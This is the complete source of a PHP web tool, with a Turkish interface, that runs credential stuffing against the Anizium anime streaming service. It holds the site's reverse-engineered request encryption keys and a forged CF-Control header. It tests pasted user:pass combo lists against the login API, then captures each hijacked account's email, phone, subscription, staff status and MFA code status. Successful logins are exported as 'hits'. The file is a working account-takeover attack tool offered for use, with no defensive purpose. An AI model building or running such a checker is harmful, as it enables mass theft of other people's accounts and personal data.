<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

// --- ANIZIUM API YARDIMCI FONKSİYONLAR ---
function x_enc($text, $key) {
    $out = ""; $keyLen = strlen($key);
    for ($i = 0; $i < strlen($text); $i++) {
        $out .= sprintf("%02x", ord($text[$i]) ^ ord($key[$i % $keyLen]));
    }
    return $out;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    $CLIENT_KEY = "16ghkdz5qnwinkyebwopbd94b49xhs";
    $TOKEN_KEY = "hlxjl1c2w281ax473rt1ofgrvhyjvi";
    $now = round(microtime(true) * 1000);
    $wd = strtolower(date('l'));

    $user_json = json_encode(["value" => $user, "password" => $pass, "date" => $now]);
    $d = x_enc($user_json, $CLIENT_KEY);

    $rand6 = substr(md5(mt_rand()), 0, 6);
    $cf_control = x_enc(json_encode($rand6 . $now), $TOKEN_KEY . "_" . $wd);

    $ch = curl_init("https://api.anizium.co/user/login");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["d" => $d]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "CF-Control: $cf_control",
        "Device: browser",
        "Origin: https://anizium.co",
        "Referer: https://anizium.co/"
    ]);
    $resJson = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($resJson['success']) && $resJson['success'] == true) {
        $sid = $resJson['session'];
        $headers = [
            "User-Session: $sid",
            "Device: browser",
            "Language: tr",
            "CF-Control: $cf_control",
            "Site: main",
            "Accept: application/json, text/javascript, */*; q=0.01",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        ];
        
        // User Data Request
        $ch2 = curl_init("https://api.anizium.co/user/get");
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
        $u_data = json_decode(curl_exec($ch2), true);
        curl_close($ch2);

        // MFA Data Request
        $ch3 = curl_init("https://api.anizium.co/mfa");
        curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
        $m_data = json_decode(curl_exec($ch3), true);
        curl_close($ch3);

        // --- CAPTURE PARSING (YAN YANA DÜZEN) ---
        $c = [];
        if(isset($u_data['nick'])) $c[] = "NICK: " . $u_data['nick'];
        if(isset($u_data['email'])) $c[] = "MAIL: " . $u_data['email'];
        if(isset($u_data['phone'])) $c[] = "PHONE: " . $u_data['phone'];
        $c[] = "SUB: " . (isset($u_data['subscription']) ? 'Premium' : 'Free');
        if(isset($u_data['infinity'])) $c[] = "INF: " . ($u_data['infinity'] ? 'Yes' : 'No');
        if(isset($u_data['staff'])) $c[] = "STAFF: " . ($u_data['staff'] ? 'Yes' : 'No');
        
        // MFA Captures
        if(isset($m_data['profile_pin_change_code'])) $c[] = "PIN_CHANGE: OK";
        if(isset($m_data['profile_delete_code'])) $c[] = "DEL_CODE: OK";
        if(isset($m_data['profile_adult_code'])) $c[] = "ADULT_CODE: OK";
        if(isset($m_data['user_password_update_information'])) $c[] = "PWD_UPDATE: OK";

        // Yan yana string oluşturma
        $capture_string = " | " . implode(" | ", $c);

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass,
            'capture_output' => $capture_string,
            'avatar' => $u_data['avatar_link'] ?? 'https://anizium.co/assets/images/user/default.png',
            'sub_text' => $u_data['subscription'] ?? 'Free'
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANIZIUM ULTRA | V4 ANIMATED</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-blue { box-shadow: 0 0 20px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 20px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 20px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(12px); border-radius: 20px; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); border: 1px solid rgba(255,255,255,0.05); }
        .main-card:hover { transform: translateY(-5px); border-color: rgba(255,255,255,0.1); }
        
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse-hit { 0% { transform: scale(0.98); } 50% { transform: scale(1); } 100% { transform: scale(0.98); } }
        
        @keyframes logo-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(59, 130, 246, 0.4); }
            50% { box-shadow: 0 0 40px rgba(59, 130, 246, 0.7); }
        }
        .logo-box { animation: logo-glow 3s infinite ease-in-out; }

        .animate-fade { animation: fadeInUp 0.6s ease forwards; }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; animation: fadeInUp 0.4s ease, pulse-hit 2s infinite ease-in-out; }
        
        .btn-shimmer { position: relative; overflow: hidden; transition: 0.3s; }
        .btn-shimmer::after { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent); transform: rotate(45deg); transition: 0.8s; }
        .btn-shimmer:hover::after { left: 120%; }
        
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 14px; color: #60a5fa; font-family: 'Consolas', monospace; transition: 0.3s; width: 100%; outline: none; }
        .input-area:focus { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.2); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 10px; }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-10 animate-fade">
        <div class="flex items-center gap-4">
            <div class="w-14 h-14 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl flex items-center justify-center logo-box border border-blue-400/30">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 3L4 21H7.5L9 17H15L16.5 21H20L12 3Z" fill="white" />
                    <path d="M10.5 13L12 9L13.5 13H10.5Z" fill="#3b82f6" />
                    <path opacity="0.3" d="M12 3L20 21H16.5L12 11L7.5 21H4L12 3Z" fill="black" />
                </svg>
            </div>
            <div>
                <h1 class="text-3xl font-black tracking-tighter italic leading-none" style="font-family: 'Syncopate', sans-serif;">
                    ANIZIUM<span class="text-blue-500 font-black">V4</span>
                </h1>
                <span class="text-[10px] text-gray-500 font-bold uppercase tracking-[0.3em]">Ultra Checker Engine</span>
            </div>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-500/20 border border-white/10 px-6 py-3 rounded-2xl text-xs font-black text-gray-400 hover:text-red-500 transition-all uppercase tracking-widest">
            <i class="fas fa-sign-out-alt mr-2"></i> geri dön
        </a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-6 mb-10 animate-fade" style="animation-delay: 0.1s;">
        <div class="main-card p-8 neon-blue">
            <span class="text-gray-500 text-xs font-black uppercase tracking-widest mb-2 block">Kalan Combo</span>
            <div class="text-5xl font-black tracking-tighter" id="kalan_val">READY</div>
        </div>
        <div class="main-card p-8 neon-green">
            <span class="text-green-500 text-xs font-black uppercase tracking-widest mb-2 block">Başarılı (HIT)</span>
            <div class="text-5xl font-black tracking-tighter text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-8 neon-red">
            <span class="text-red-500 text-xs font-black uppercase tracking-widest mb-2 block">Hatalı (FAIL)</span>
            <div class="text-5xl font-black tracking-tighter text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-6 animate-fade" style="animation-delay: 0.2s;">
            <div class="main-card p-8 shadow-2xl">
                <div class="flex items-center gap-3 mb-6">
                    <i class="fas fa-database text-blue-500"></i>
                    <h2 class="text-xl font-black uppercase italic">Combo List</h2>
                </div>
                <textarea id="accs" class="input-area h-[300px] p-5 text-xs leading-relaxed" placeholder="user:pass"></textarea>
                <button id="btn" onclick="startCheck()" class="btn-shimmer w-full mt-6 py-5 bg-blue-600 hover:bg-blue-700 rounded-2xl text-white font-black uppercase tracking-[0.2em] shadow-lg shadow-blue-600/20 text-sm">
                    SİSTEMİ ÇALIŞTIR
                </button>
            </div>
            
            <div class="main-card p-6 h-48 overflow-y-auto border border-white/5 bg-black/60 font-mono text-[11px]" id="mini_log">
                <div class="text-gray-600 tracking-widest uppercase mb-2 animate-pulse">Initializing Engine...</div>
            </div>
        </div>

        <div class="lg:col-span-8 animate-fade" style="animation-delay: 0.3s;">
            <div class="flex justify-between items-end mb-6">
                <h2 class="text-2xl font-black uppercase italic tracking-tighter">Capture <span class="text-blue-500">Terminal</span></h2>
                <button onclick="downloadHits()" class="btn-shimmer bg-green-600/10 hover:bg-green-600 border border-green-600/30 text-green-500 hover:text-white px-8 py-3 rounded-2xl text-xs font-black uppercase tracking-widest transition-all">
                    <i class="fas fa-file-export mr-2"></i> VERİLERİ DIŞA AKTAR
                </button>
            </div>
            
            <div class="main-card p-8 h-[720px] overflow-y-auto space-y-6" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full text-gray-800 italic opacity-20">
                    <i class="fas fa-terminal text-8xl mb-6"></i>
                    <p class="font-black tracking-[0.5em] uppercase text-lg">Awaiting Data Streams...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let running = false;
        let hits = 0; let fails = 0;
        let hitResults = [];

        async function startCheck() {
            if(running) { running = false; return; }
            const input = document.getElementById('accs').value.trim();
            const list = input.split('\n').filter(l => l.includes(':'));
            if(!list.length) return;

            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR";
            btn.classList.replace('bg-blue-600', 'bg-red-600');
            
            for(let line of list) {
                if(!running) break;
                document.getElementById('kalan_val').innerText = list.length - (hits + fails);
                
                const [u, p] = line.trim().split(':');
                const mini = document.getElementById('mini_log');
                
                mini.innerHTML += `<div class="text-blue-400/70">[*] Analyzing: ${u}...</div>`;
                mini.scrollTop = mini.scrollHeight;

                try {
                    const fd = new FormData(); fd.append('user', u); fd.append('pass', p);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();

                    if(res.status === 'success') {
                        hits++;
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass}${res.capture_output}`);
                        mini.innerHTML += `<div class="text-green-500 font-bold shadow-green-500/20">[+] HIT: ${u}</div>`;
                        addHitUI(res);
                    } else {
                        fails++;
                        document.getElementById('fail_count').innerText = fails;
                        mini.innerHTML += `<div class="text-red-500 opacity-60">[-] FAIL: ${u}</div>`;
                    }
                    mini.scrollTop = mini.scrollHeight;
                } catch(e) {
                    console.error(e);
                }
            }
            
            running = false;
            btn.innerText = "SİSTEMİ ÇALIŞTIR";
            btn.classList.replace('bg-red-600', 'bg-blue-600');
            document.getElementById('kalan_val').innerText = "DONE";
        }

        function addHitUI(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = 'hit-box p-4 hover:scale-[1.01] transition-all';
            div.innerHTML = `
                <div class="flex flex-wrap items-center justify-between gap-4">
                    <div class="flex items-center gap-4">
                        <img src="${res.avatar}" class="w-12 h-12 rounded-xl object-cover border border-green-500/30" onerror="this.src='https://anizium.co/assets/images/user/default.png'">
                        <div>
                            <span class="text-sm text-white font-bold">${res.user}:${res.pass}</span>
                            <div class="text-[11px] text-green-400 font-mono mt-0.5">${res.capture_output}</div>
                        </div>
                    </div>
                    <div class="bg-green-500/10 px-4 py-1.5 rounded-lg border border-green-500/20">
                        <span class="text-[10px] text-green-500 font-black uppercase">${res.sub_text}</span>
                    </div>
                </div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `Anizium_Hits_Export.txt`;
            a.click();
        }
    </script>
</body>
</html>